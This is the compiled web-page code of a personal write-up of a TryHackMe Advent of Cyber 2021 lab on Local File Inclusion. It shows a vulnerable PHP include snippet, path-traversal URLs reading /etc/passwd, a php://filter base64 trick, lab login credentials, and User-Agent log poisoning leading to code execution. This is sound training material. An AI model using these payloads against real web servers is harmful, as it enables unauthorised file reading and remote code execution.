"use strict";(self.webpackChunkinsights=self.webpackChunkinsights||[]).push([[3488],{8141:(e,s,n)=>{n.r(s),n.d(s,{Highlight:()=>u,assets:()=>h,contentTitle:()=>c,default:()=>x,frontMatter:()=>l,metadata:()=>d,toc:()=>p});var t=n(5893),i=n(1151),a=(n(7294),n(6010));const r={browserWindow:"browserWindow_my1Q",browserWindowHeader:"browserWindowHeader_jXSR",row:"row_KZDM",buttons:"buttons_uHc7",right:"right_oyze",browserWindowAddressBar:"browserWindowAddressBar_Pd8y",dot:"dot_giz1",browserWindowMenuIcon:"browserWindowMenuIcon_Vhuh",bar:"bar_rrRL",browserWindowBody:"browserWindowBody_Idgs"};function o(e){let{children:s,minHeight:n,url:i="http://localhost:3000"}=e;return(0,t.jsxs)("div",{className:r.browserWindow,style:{minHeight:n},children:[(0,t.jsxs)("div",{className:r.browserWindowHeader,children:[(0,t.jsxs)("div",{className:r.buttons,children:[(0,t.jsx)("span",{className:r.dot,style:{background:"#f25f58"}}),(0,t.jsx)("span",{className:r.dot,style:{background:"#fbbe3c"}}),(0,t.jsx)("span",{className:r.dot,style:{background:"#58cb42"}})]}),(0,t.jsx)("div",{className:(0,a.Z)(r.browserWindowAddressBar,"text--truncate"),children:i}),(0,t.jsx)("div",{className:r.browserWindowMenuIcon,children:(0,t.jsxs)("div",{children:[(0,t.jsx)("span",{className:r.bar}),(0,t.jsx)("span",{className:r.bar}),(0,t.jsx)("span",{className:r.bar})]})})]}),(0,t.jsx)("div",{className:r.browserWindowBody,children:s})]})}const l={id:"Advent of Cyber 2021 Day 6",title:"Day 6",description:"\u200a[Day 6] Web Exploitation - Patch management is Hard"},c=void 0,d={id:"TryHackMe/Advent-Of-Cyber-2021/Modules/Days 1-7 ~ Web Exploitation/Advent of Cyber 2021 Day 6",title:"Day 6",description:"\u200a[Day 6] Web Exploitation - Patch management is Hard",source:"@site/docs/02-TryHackMe/Advent-Of-Cyber-2021/Modules/01-Days 1-7 ~ Web Exploitation/Day 6.mdx",sourceDirName:"02-TryHackMe/Advent-Of-Cyber-2021/Modules/01-Days 1-7 ~ Web Exploitation",slug:"/TryHackMe/Advent-Of-Cyber-2021/Modules/Days 1-7 ~ Web Exploitation/Advent of Cyber 2021 Day 6",permalink:"/Insights-N-Notes/docs/TryHackMe/Advent-Of-Cyber-2021/Modules/Days 1-7 ~ Web Exploitation/Advent of Cyber 2021 Day 6",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{id:"Advent of Cyber 2021 Day 6",title:"Day 6",description:"\u200a[Day 6] Web Exploitation - Patch management is Hard"},sidebar:"mySideBar",previous:{title:"Day 5",permalink:"/Insights-N-Notes/docs/TryHackMe/Advent-Of-Cyber-2021/Modules/Days 1-7 ~ Web Exploitation/Advent of Cyber 2021 Day 5"},next:{title:"Day 7",permalink:"/Insights-N-Notes/docs/TryHackMe/Advent-Of-Cyber-2021/Modules/Days 1-7 ~ Web Exploitation/Advent of Cyber 2021 Day 7"}},h={},p=[{value:"[Day 6] <Highlight>Web Exploitation</Highlight> Patch Management Is Hard",id:"day-6-web-exploitation-patch-management-is-hard",level:2},{value:"Local File Inclusion (LFI) vulnerability",id:"local-file-inclusion-lfi-vulnerability",level:3},{value:"SideNote",id:"sidenote",level:3}],u=({children:e,color:s})=>{const n={span:"span",...(0,i.a)()};return(0,t.jsx)(n.span,{style:{backgroundColor:s,borderRadius:"2px",color:"#fff",padding:"0.2rem"},children:e})};function g(e){const s={blockquote:"blockquote",code:"code",em:"em",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(s.h2,{id:"day-6-web-exploitation-patch-management-is-hard",children:["[Day 6] ",(0,t.jsx)(u,{color:"#621d27",children:"Web Exploitation"})," Patch Management Is Hard"]}),"\n",(0,t.jsxs)(s.blockquote,{children:["\n",(0,t.jsx)(s.p,{children:"During a routine security audit before the Incident, McSkidy discovered some recovery passwords on an old server. She created a ticket to decommission this server to reduce this security vulnerability. The Elf assigned to fix this vulnerability kept pushing off the task, and this never got done. Luckily, some of those recovery keys can be used to save some systems."}),"\n"]}),"\n",(0,t.jsxs)(s.blockquote,{children:["\n",(0,t.jsx)(s.p,{children:"Unfortunately, the only way to access the server is through an old web application. See if you can pull out those recovery keys to help McSkidy with her pursuit to save Christmas."}),"\n"]}),"\n",(0,t.jsx)(s.h3,{id:"local-file-inclusion-lfi-vulnerability",children:"Local File Inclusion (LFI) vulnerability"}),"\n",(0,t.jsx)(s.p,{children:"LFI is a vuln in web applications. In PHP, some functions could cause these vulns."}),"\n",(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.code,{children:"include"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.code,{children:"require"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.code,{children:"include_once"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.code,{children:"require_once"})}),"\n"]}),"\n",(0,t.jsx)(s.p,{children:"For example, these functions could be used by a bad actor to include confidential files. Improper input validation could lead to such issues."}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{children:'<?PHP \r\n\tinclude($_GET["file"]);\r\n?>\n'})}),"\n",(0,t.jsx)(s.p,{children:"A sample demonstration of guessing an exploit"}),"\n",(0,t.jsx)(s.p,{children:"An LFI exploit could also be chained with RCE."}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.code,{children:"http://example.thm.labs/index.php?file=welcome.txt"}),"\r\nDemonstration of HTTP request"]}),"\n",(0,t.jsx)(s.p,{children:"In File Inclusion, we are trying to enter directories that we normally shouldnt have access to."}),"\n",(0,t.jsx)(s.p,{children:"Some Additional examples (some are escaping, or attempting to escape dirs):"}),"\n",(0,t.jsx)(o,{url:"http://localhost:3000",children:(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-http",metastring:'title="Sample HTTP requests"',children:"http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd \r\nhttp://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 \r\nhttp://example.thm.labs/page.php?file=....//....//....//....//etc/passwd \r\nhttp://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd\n"})})}),"\n",(0,t.jsx)(s.p,{children:"Here the machine challenge is simpler. However, note that there is no protection:\r\nhttp://MACHINE_IP/index.php?err=/etc/flag"}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"initialLFI.png",src:n(3296).Z+"",width:"776",height:"210"})}),"\n",(0,t.jsx)(s.p,{children:"Trying to apply the php filter technique"}),"\n",(0,t.jsx)(s.p,{children:"http://MACHINE_IP/index.php?err=php://filter/convert.base64-encode/resource=index.php"}),"\n",(0,t.jsxs)(s.p,{children:["The earlier proof of concept explained how we notice errors such as this\r\n",(0,t.jsx)(s.img,{alt:"errors.png",src:n(3063).Z+"",width:"797",height:"320"}),"\r\nBecause the server is attempting to execute the php code. So instead, we bypass this by encoding the returned page instead, so that we can view the pages."]}),"\n",(0,t.jsxs)(s.p,{children:["Now that we have decoded the page content, we see an interesting manage.php file\r\n",(0,t.jsx)(s.img,{alt:"base64encode.png",src:n(6664).Z+"",width:"622",height:"375"})]}),"\n",(0,t.jsxs)(s.p,{children:["Okay, now there's this stuff...\r\n",(0,t.jsx)(s.img,{alt:"morebase64.png",src:n(7224).Z+"",width:"990",height:"693"})]}),"\n",(0,t.jsxs)(s.p,{children:["Notice this in the passwordrecovery file\r\n",(0,t.jsx)(s.img,{alt:"handy.png",src:n(546).Z+"",width:"973",height:"674"}),"\r\n(This will be for server details when we execute our php filter)"]}),"\n",(0,t.jsx)("br",{}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.img,{alt:"includes.png",src:n(2529).Z+"",width:"361",height:"244"}),(0,t.jsx)("br",{}),"\r\n(This will provide login credentials as shown in the next photo)"]}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.img,{alt:"logininfo.png",src:n(3875).Z+"",width:"700",height:"537"}),(0,t.jsx)("br",{}),"\r\nMcSkidy",":A0C315Aw3s0m"]}),"\n",(0,t.jsx)(s.p,{children:"In this demonstration, we can now view the log and see how it logs user requests'. We will attempt to add our RCE injection in User-Agent so that the server will automatically execute."}),"\n",(0,t.jsx)(o,{url:"http://localhost:3000",children:(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:'curl -A "This is testing" http://MACHINE_IP.p.thmlabs.com/login.php\n'})})}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.img,{alt:"login.png",src:n(3875).Z+"",width:"700",height:"537"}),(0,t.jsx)("br",{}),"\r\nThrough this simple command we note there are 0 filterings allowing such a command to execute to execute RCE."]}),"\n",(0,t.jsx)(s.p,{children:"http://MACHINE_IP/index.php?err=./includes/logs/app_access.log\r\nIf you access the page on a signed out user, you can now see your injection and its fruits"}),"\n",(0,t.jsxs)(s.p,{children:["And that's the name of the hostname\r\n",(0,t.jsx)(s.img,{alt:"sysinfo.png",src:n(6193).Z+"",width:"743",height:"171"})]}),"\n",(0,t.jsx)(s.h3,{id:"sidenote",children:"SideNote"}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.em,{children:"By far the hardest day so far, also had to check the walktrhough to better understand what was going on as well as to just understand the steps"})})]})}function x(e={}){const{wrapper:s}={...(0,i.a)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(g,{...e})}):g(e)}},6664:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/base64encode-5b163ce66fceb0d2d51dc6164c518c61.png"},3063:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/errors-35905e6e5e5ee17ec37b38fae250a969.png"},546:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/handy-9dc4e9dc7ecce5adec729353b676a62e.png"},2529:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/includes-0bff46029015a5827759842bbb048b60.png"},3296:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/initialLFI-7fd5ba24f62f22626a9e929bc41b9732.png"},3875:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/logininfo-9af3630b6d8fdf8baa878934ecccceac.png"},7224:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/morebase64-de16f3b74aa35afd4e9516ccf378c464.png"},6193:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/sysinfo-a6885515b84c9a94308f96696a32e761.png"},1151:(e,s,n)=>{n.d(s,{Z:()=>o,a:()=>r});var t=n(7294);const i={},a=t.createContext(i);function r(e){const s=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function o(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(a.Provider,{value:s},e.children)}}}]);